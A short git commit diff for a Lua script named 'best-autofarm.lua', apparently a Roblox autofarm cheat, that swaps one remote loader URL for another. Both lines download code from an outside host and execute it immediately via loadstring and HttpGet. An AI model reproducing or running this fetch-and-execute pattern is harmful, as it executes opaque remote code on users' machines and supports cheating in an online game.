46cbae639bec6876831e3201a017f97289157e6b
zcwi4crpz <innierdabodabo@gmail.com>
2026-08-02 19:42:19 +0800

    Update best-autofarm.lua

--- best-autofarm.lua
+++ best-autofarm.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NnFpr6aUUL/0", true))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjllNWM2ODJlLWE1ZWQtNGNhNy04MzhkLTZhMGE0MThmYmNjZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
